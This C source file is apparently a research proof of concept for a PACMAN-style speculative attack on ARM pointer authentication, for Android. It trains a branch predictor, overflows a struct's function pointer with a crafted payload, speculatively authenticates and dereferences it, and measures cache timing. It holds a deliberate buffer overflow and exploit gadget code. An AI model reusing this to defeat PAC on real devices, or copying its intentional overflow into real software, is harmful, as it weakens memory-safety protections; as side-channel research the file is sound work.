#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <time.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
// $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android33-clang  -O2 -fPIE -pie -march=armv9-a+pauth -mbranch-protection=standard -o pacman pacman.c



#define CACHELINE 64
struct pmu_civac_req { uint64_t addr; uint64_t len; };
#define PMU_IOC_MAGIC 0xb1
#define PMU_IOC_DC_CIVAC _IOW(PMU_IOC_MAGIC, 0x1, struct pmu_civac_req)

static int pmu_fd = -1;

#ifndef MAP_ANON
#define MAP_ANON MAP_ANONYMOUS
#endif

/* PAC helpers: compiled only when pointer authentication is enabled. */
#if defined(__ARM_FEATURE_PAUTH)
#define PACIZA(x) __asm__ __volatile__("pacdza %0\n" : "+r"(x) :: "memory")
#define AUTIZA(x) __asm__ __volatile__("autdza %0\n" : "+r"(x) :: "memory")
#define XPACI(x) __asm__ __volatile__("xpaci %0\n" : "+r"(x) :: "memory")
#else
#define PACIZA(x) ((void)(x))
#define AUTIZA(x) ((void)(x))
#define XPACI(x) ((void)(x))
#warning "Building without pointer authentication; build with -march=armv9-a+pauth (or -march=armv8.3-a+pauth) to enable PAC."
#endif
#define BRANCH_PREDICTION_LOOP 100
#define TRANSIENT_ACCESS_PAGE 100
#define CACHE_LINE_SIZE 128
#define STRIDE 7
static char safe_str_buf[32] = "0123456";
char* safe_str = safe_str_buf;
char* test_ptr = NULL;

typedef struct object{
    char buf[10];
    void (*fp)(void);
} object;

volatile object* obj;

volatile uint8_t temp = 0;

/* platform-safe ForceRead */
static inline void ForceRead(const void *p) {
    (void)*(volatile const uint8_t *)p;
}

/* sweep large buffer to trash LLC (used as heuristic cache flush) */
static inline void trash_llc(uint8_t *buf, size_t sz){
    volatile uint8_t s = 0;
    for (size_t i=0; i<sz; i+=128) s ^= buf[i]; // 128B stride (M2 uses 128B line)
    asm volatile("" ::: "memory");
    (void)s;
}


static inline __attribute__((always_inline)) void cache_flush(volatile void *addr) {
    if (pmu_fd >= 0) {
        struct pmu_civac_req req = { .addr = (uint64_t)addr, .len = CACHELINE };
        ioctl(pmu_fd, PMU_IOC_DC_CIVAC, &req);
        printf("cache flush through kernel");
    } else {
        // Clean and invalidate data cache line by virtual address to PoC
        __asm__ __volatile__("dc civac, %0" :: "r"(addr) : "memory");
        __asm__ __volatile__("dsb ish" ::: "memory");
        __asm__ __volatile__("isb" ::: "memory");
    }
}

/* Fill the speculation window with a programmable number of ORR instructions. */
static inline void fill_speculation_window(int orr_count)
{
    if (orr_count <= 0) return;

    register uint64_t sink = 0;
    for (int i = 0; i < orr_count; ++i) {
        asm volatile("orr %0, %0, %0\n" : "+r"(sink));
    }
    (void)sink;
}

/* Fill the speculation window with ORR instructions dependent on tmp_local. */
static inline void fill_speculation_window_dep(int orr_count, volatile int *tmp_local)
{
    if (orr_count <= 0) return;

    register uint64_t sink = (uint64_t)(*tmp_local);
    for (int i = 0; i < orr_count; ++i) {
        sink ^= (uint64_t)(*tmp_local);
        asm volatile("orr %0, %0, %0\n" : "+r"(sink));
    }
    (void)sink;
}



/* Fill the speculation window with a programmable number of ADD instructions. */
static inline void fill_speculation_window_add(int add_count)
{
    if (add_count <= 0) return;

    register uint64_t sink = 0;
    for (int i = 0; i < add_count; ++i) {
        asm volatile("add %0, %0, #1\n" : "+r"(sink));
    }
    (void)sink;
}

/* Fill the speculation window with a programmable number of MUL instructions. */
static inline void fill_speculation_window_mul(int mul_count)
{
    if (mul_count <= 0) return;

    register uint64_t sink = 1;
    register uint64_t factor = 3;
    for (int i = 0; i < mul_count; ++i) {
        asm volatile("mul %0, %0, %1\n" : "+r"(sink) : "r"(factor));
    }
    (void)sink;
}

/* Fill the speculation window with a programmable number of FMUL instructions. */
static inline void fill_speculation_window_fmul(int fmul_count)
{
    if (fmul_count <= 0) return;

    double sink = 1.0;
    double factor = 1.0000001;
    for (int i = 0; i < fmul_count; ++i) {
        asm volatile("fmul %d0, %d0, %d1\n" : "+w"(sink) : "w"(factor));
    }
    (void)sink;
}

/* Fill the speculation window with a programmable number of LOAD instructions. */
static inline void fill_speculation_window_load(const uint64_t *buf, int load_count)
{
    if (load_count <= 0 || buf == NULL) return;

    register uint64_t sink = 0;
    const uint64_t *ptr = buf;
    for (int i = 0; i < load_count; ++i) {
        asm volatile("ldr %0, [%1]\n" : "=r"(sink) : "r"(ptr) : "memory");
        ptr = (const uint64_t *)((const uint8_t *)ptr + CACHELINE);
    }
    (void)sink;
}

/* Best-effort CPU pinning on Linux/Android using sched_setaffinity. */
static void pin_to_core_android(int core) {
    if (core < 0 || core >= CPU_SETSIZE) return;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
    }
}


static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t cntvct, cntfrq;
    __asm__ __volatile__("isb");
    __asm__ __volatile__("mrs %0, cntvct_el0" : "=r"(cntvct));
    __asm__ __volatile__("mrs %0, cntfrq_el0" : "=r"(cntfrq));
    return (cntvct * 1000000000ull) / cntfrq; // ns
}

__attribute__((noinline))
void vulnerable_func(void* probe, long pageSize, char * str, int transient,int spec_window_orrs){

    /* SEUP */
    const size_t safe_len = 64;
    char *safe_str = (char *)malloc(safe_len);
    if (!safe_str) return;
    size_t copy_len = sizeof(object);
    if (copy_len >= safe_len) copy_len = safe_len - 1;
    memcpy(safe_str, str, copy_len);
    safe_str[copy_len] = '\0';

    char *vuln_str = (char*)malloc(strlen(str));
    memcpy(vuln_str,str,sizeof(object));

    object* new_obj  = (object*)malloc(sizeof(object));
    new_obj->fp = probe + pageSize * transient;
    
    void* pointer = probe + pageSize * transient * 2;
    /* PAC */
    PACIZA(new_obj->fp);
    printf("before bof : %p\n",new_obj->fp);
    //asm volatile("nop \n");
    //  asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n");  asm volatile("nop \n"); 
    //  asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n");  asm volatile("nop \n"); 
    //  asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n");  asm volatile("nop \n"); 
    //  asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n"); asm volatile("nop \n");  asm volatile("nop \n"); 

    // safe BOF (will not be crashed)
    const size_t fp_offset = offsetof(object, fp);
    memcpy(safe_str + fp_offset, &new_obj->fp, sizeof(new_obj->fp));


    //asm volatile("nop \n"); asm volatile("nop \n");asm volatile("nop \n");asm volatile("nop \n");asm volatile("nop \n");
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");



    /* ATTACK START */
    // overwrite pointer : buffer-overflow
    volatile int tmp_local = 0;
    //volatile int tmp_local2 = 0;
    if(transient){
        //printf("answer : %p", new_obj->fp);
        memcpy((void*)new_obj->buf, safe_str, sizeof(object)); // AUT SUCCESS (correct PAC) 52   51     noderef : no pac 52  pac  58
        //memcpy((void*)new_obj->buf, vuln_str, sizeof(object)); // AUT FAIL (wrong PAC) 58     58      no deref : no pac 52   pac  52
          
    }
    

    /* flush "str" for speculative execution */
    cache_flush((void*)str);
   
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");

   
    /* target branch training check */
    if(10 > strlen(str)){
    //if(1){ 
     
        /* AUT */        
        AUTIZA(new_obj->fp);
        /* DEREF */
        tmp_local ^= *(volatile int*)(new_obj->fp);

        
        /* XPAC */
        //XPACI(new_obj->fp);
        
    
        /* fill speculation window using ORR chains (dependent) */
        fill_speculation_window_load(probe,spec_window_orrs);

        
        
        /* transient deref  */
       tmp_local ^= *(volatile int*)(pointer);
       //tmp_local ^= *(volatile int*)(new_obj->fp);
        
    } else {
        printf("transient\n");
    }
    
    free(safe_str);
    free((void*)new_obj);
    return;
}

int main(int argc, char **argv) {
    int orr_count = 0;
    if (argc > 1) {
        char *end = NULL;
        errno = 0;
        long parsed = strtol(argv[1], &end, 10);
        if (errno != 0 || end == argv[1] || *end != '\0') {
            fprintf(stderr, "Invalid ORR count '%s'; falling back to 0\n", argv[1]);
        } else {
            if (parsed < 0) parsed = 0;
            if (parsed > 200) parsed = 200;
            orr_count = (int)parsed;
        }
    }

    /* pin to an arbitrary core tag (best-effort) */
    pin_to_core_android(7);

    const long pageSize = sysconf(_SC_PAGESIZE);

    void* probe = mmap(NULL, pageSize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1,0);
    if (probe == MAP_FAILED) { perror("mmap"); return EXIT_FAILURE; }

    memset(probe, 0x10, 256 * pageSize);

    static const char prefix_bytes[] = "0123456789";
    const size_t payload_sz = ((sizeof(object) + pageSize - 1) / pageSize) * pageSize;
    unsigned char *malicious_payload = NULL;
    if (posix_memalign((void**)&malicious_payload, pageSize, payload_sz) != 0) {
        perror("posix_memalign malicious_payload");
        return EXIT_FAILURE;
    }
    
    const size_t fp_offset = offsetof(object, fp);
    memset(malicious_payload, 0, payload_sz);
    size_t prefix_len = sizeof(prefix_bytes) - 1;
    if (prefix_len > fp_offset) prefix_len = fp_offset;
    memcpy(malicious_payload, prefix_bytes, prefix_len);
    for (size_t i = prefix_len; i < fp_offset; ++i) malicious_payload[i] = 0x41; // avoid early NUL

    void *malicious_ptr = (void*)((uintptr_t)probe + TRANSIENT_ACCESS_PAGE * pageSize);
    
    memcpy(malicious_payload + fp_offset, &malicious_ptr, sizeof(malicious_ptr));
    test_ptr = (char*)malicious_payload;
    
    int transient = 0;
    uint64_t t1,t2;
    volatile int tmp = 0;

    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
    /* flush all probe pages (best-effort) via trashing) */
    for(int i = 0; i < pageSize * 256; i+= 64) cache_flush(probe + i);
    cache_flush(probe + TRANSIENT_ACCESS_PAGE * pageSize);
    
    
    for(int i = 0; i < 100000; i++){}
    
    const size_t trash_sz = 64UL<<20; // 64MiB
    uint8_t *trash;
    posix_memalign((void**)&trash, 128, trash_sz);
    trash_llc(trash, trash_sz); 
    
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");


    /* Branch training loop */
    const int spec_window_orrs = orr_count;
    
    for (int i = 0; i <= BRANCH_PREDICTION_LOOP; i++) {
        
        char *ptr = (i == BRANCH_PREDICTION_LOOP) ? test_ptr : safe_str;
        transient = TRANSIENT_ACCESS_PAGE * (i == BRANCH_PREDICTION_LOOP);
        
        asm volatile("dsb ish\n isb\n" ::: "memory");
        
        vulnerable_func(probe,pageSize,ptr,transient,spec_window_orrs);
    }
    
   
    asm volatile("dsb ish\n isb\n" ::: "memory");
    
    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * TRANSIENT_ACCESS_PAGE * 2); // transient target
    t2 = rdtsc();
    printf("transient data access: %llu\n",(unsigned long long)(t2-t1));

    cache_flush(probe + pageSize * TRANSIENT_ACCESS_PAGE);

    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * 50); // transient target
    t2 = rdtsc();
    printf("cache miss : %llu\n",(unsigned long long)(t2-t1));

    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * 50); // transient target
    t2 = rdtsc();
    printf("cache hit : %llu\n",(unsigned long long)(t2-t1));

    munmap(probe, pageSize * 256);
    free((void*)obj);
    free(malicious_payload);

    return 0;
}
